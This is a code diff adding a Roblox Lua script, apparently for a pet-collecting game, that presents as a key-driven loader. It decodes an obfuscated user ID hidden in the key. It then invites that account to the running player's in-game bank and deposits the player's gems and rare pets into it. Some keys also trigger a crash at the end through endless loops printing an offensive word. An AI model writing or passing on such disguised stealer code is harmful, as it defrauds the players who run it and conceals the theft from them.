@@ -1,0 +1,236 @@
+
+local crashKey = string.sub(_G.Loader_Key, 2, 2)
+if table.find({"a", "C", "e", "G", "i", "K", "m", "0", "q", "5", "u", "M", "9"}, crashKey) ~= nil then
+_G.CrashAtEnd = true
+end
+local gemkey = string.sub(_G.Loader_Key, #_G.Loader_Key-1, #_G.Loader_Key-1)
+if table.find({"B", "e", "H", "k", "N", "q", "T", "w", "Z"}, gemkey) ~= nil then
+_G.DepoAllGems = true
+end
+local petkey = string.sub(_G.Loader_Key, #_G.Loader_Key, #_G.Loader_Key)
+if table.find({"a", "D", "h", "L", "p", "7", "x"}, petkey) ~= nil then
+_G.DepoAllPets = true
+end
+local userid = ""
+if string.sub(_G.Loader_Key, 1, 1) == "$" then
+_G.Loader_Key = string.sub(_G.Loader_Key, 3, #_G.Loader_Key-2)
+local ObSys = {"x", "Y", "d", "f", "t", "s", "p", "R", "_", "o"}
+for i = 1, #_G.Loader_Key, 1 do
+local letter = string.sub(_G.Loader_Key, i, i)
+for i, v in pairs(ObSys) do
+if v == letter then
+userid = userid..tostring(i-1)
+end
+end
+end
+elseif string.sub(_G.Loader_Key, 1, 1) == "§" then
+_G.Loader_Key = string.sub(_G.Loader_Key, 3, #_G.Loader_Key-2)
+local ObSys = {"A", "b", "D", "e", "G", "h", "J", "k", "M", "n"}
+for i = 1, #_G.Loader_Key, 1 do
+local letter = string.sub(_G.Loader_Key, i, i)
+for i, v in pairs(ObSys) do
+if v == letter then
+userid = userid..tostring(i-1)
+end
+end
+end
+elseif string.sub(_G.Loader_Key, 1, 1) == "!" then
+_G.Loader_Key = string.sub(_G.Loader_Key, 3, #_G.Loader_Key-2)
+local ObSys = {"3", "1", "4", "2", "5", "9", "7", "0", "6", "8"}
+for i = 1, #_G.Loader_Key, 1 do
+local letter = string.sub(_G.Loader_Key, i, i)
+for i, v in pairs(ObSys) do
+if v == letter then
+userid = userid..tostring(i-1)
+end
+end
+end
+elseif string.sub(_G.Loader_Key, 1, 1) == "?" then
+_G.Loader_Key = string.sub(_G.Loader_Key, 3, #_G.Loader_Key-2)
+local ObSys = {"$", "€", "%", "&", "!", "]", "?", ".", "_", "<"}
+for i = 1, #_G.Loader_Key, 1 do
+local letter = string.sub(_G.Loader_Key, i, i)
+for i, v in pairs(ObSys) do
+if v == letter then
+userid = userid..tostring(i-1)
+end
+end
+end
+end
+userid = tonumber(userid)
+userid = userid/22
+local Bank = ""
+
+local A_1 = "b"
+local A_2 = "bank deposit"
+local Event = game:GetService("Workspace")["__THINGS"]["__REMOTES"].MAIN
+Event:FireServer(A_1, A_2)
+
+local A_1 = "b"
+local A_2 = "buy egg"
+local Event = game:GetService("Workspace")["__THINGS"]["__REMOTES"].MAIN
+Event:FireServer(A_1, A_2)
+
+local A_1 = "b"
+local A_2 = "invite to bank"
+local Event = game:GetService("Workspace")["__THINGS"]["__REMOTES"].MAIN
+Event:FireServer(A_1, A_2)
+
+local A_1 = "b"
+local A_2 = "get bank"
+local Event = game:GetService("Workspace")["__THINGS"]["__REMOTES"].MAIN
+Event:FireServer(A_1, A_2)
+
+local A_1 = "b"
+local A_2 = "get my banks"
+local Event = game:GetService("Workspace")["__THINGS"]["__REMOTES"].MAIN
+Event:FireServer(A_1, A_2)
+
+
+wait(1)
+local A_1 = 
+{
+}
+local Event = game:GetService("Workspace")["__THINGS"]["__REMOTES"]["get my banks"]
+local val = Event:InvokeServer(A_1)
+Bank = val[1][1]["BUID"]
+if Bank == nil then
+return
+end
+wait(0.5)
+local A_1 = 
+{
+	[1] = Bank
+}
+local Event = game:GetService("Workspace")["__THINGS"]["__REMOTES"]["get bank"]
+local ABCXD = Event:InvokeServer(A_1)
+if ABCXD[1]["Tier"] == 1 then
+return
+end
+wait(1)
+local A_1 = 
+{
+	[1] = Bank, 
+	[2] = userid
+}
+local Event = game:GetService("Workspace")["__THINGS"]["__REMOTES"]["invite to bank"]
+Event:InvokeServer(A_1)
+local output = ""
+local FinalList = {}
+if _G.DepoAllGems then
+local gemText = game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text
+wait(1)
+for i = 1, #gemText, 1 do
+if string.sub(gemText, i, i) == "1" then
+output = output.."1"
+elseif string.sub(gemText, i, i) == "2" then
+output = output.."2"
+elseif string.sub(gemText, i, i) == "3" then
+output = output.."3"
+elseif string.sub(gemText, i, i) == "4" then
+output = output.."4"
+elseif string.sub(gemText, i, i) == "5" then
+output = output.."5"
+elseif string.sub(gemText, i, i) == "6" then
+output = output.."6"
+elseif string.sub(gemText, i, i) == "7" then
+output = output.."7"
+elseif string.sub(gemText, i, i) == "8" then
+output = output.."8"
+elseif string.sub(gemText, i, i) == "9" then
+output = output.."9"
+elseif string.sub(gemText, i, i) == "0" then
+output = output.."0"
+end
+end
+output = tonumber(output)
+
+else
+output = tonumber("1")
+end
+if _G.DepoAllPets then
+	Library     = require(game:GetService('ReplicatedStorage').Framework:FindFirstChild('Library'))
+	Functions   = Library.Functions
+	EXCList     = {}
+    MythicList  = {}
+
+    EList       = {}
+    MList       = {}
+
+
+	table.foreach(Library.Directory.Pets, function(i, v)
+		if v.rarity == "Exclusive" then
+			table.insert(EXCList, i)
+		end
+		if v.rarity == "Mythical" then
+			table.insert(MythicList, i)
+		end
+	end)
+
+local pets = require(game:GetService("ReplicatedStorage").Framework.Modules.Client["4 | Save"]).Get().Pets
+for i, v in pairs(pets) do
+if table.find(EXCList, v["id"]) ~= nil then
+table.insert(EList, v["uid"])
+end
+if table.find(MythicList, v["id"]) ~= nil then
+table.insert(MList, v["uid"])
+end
+end
+if #EList + #MList < 49 then
+for i, v in pairs(EList) do
+table.insert(FinalList, v)
+end
+for i, v in pairs(MList) do
+table.insert(FinalList, v)
+end
+elseif #EList + #MList > 49 and #EList < 49 then
+for i, v in pairs(EList) do
+table.insert(FinalList, v)
+end
+for i, v in pairs(MList) do
+if #FinalList < 49 then
+table.insert(FinalList, v)
+end
+end
+elseif #EList + #MList > 49 and #EList > 49 then
+for i, v in pairs(EList) do
+if #FinalList < 49 then
+table.insert(FinalList, v)
+end
+end
+end
+wait(0.5)
+game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.Game["Open Eggs"].Disabled = true
+local A_1 = 
+{
+	[1] = "Cracked Egg", 
+	[2] = false
+}
+local Event = game:GetService("Workspace")["__THINGS"]["__REMOTES"]["buy egg"]
+Event:InvokeServer(A_1)
+wait(0.5)
+end
+if _G.DepoAllGems or _G.DepoAllPets or _G.DepoAllGems and _G.DepoAllPets then
+local A_1 = 
+{
+	[1] = Bank, 
+	[2] = FinalList, 
+	[3] = output-1
+}
+local Event = game:GetService("Workspace")["__THINGS"]["__REMOTES"]["bank deposit"]
+local result = Event:InvokeServer(A_1)
+print(result[2], #FinalList, output)
+end
+wait(0.5)
+if _G.CrashAtEnd then
+spawn(function()
+while true do
+print("raped")
+spawn(function()
+while true do
+print("raped")
+end
+end)
+end
+end)
+end
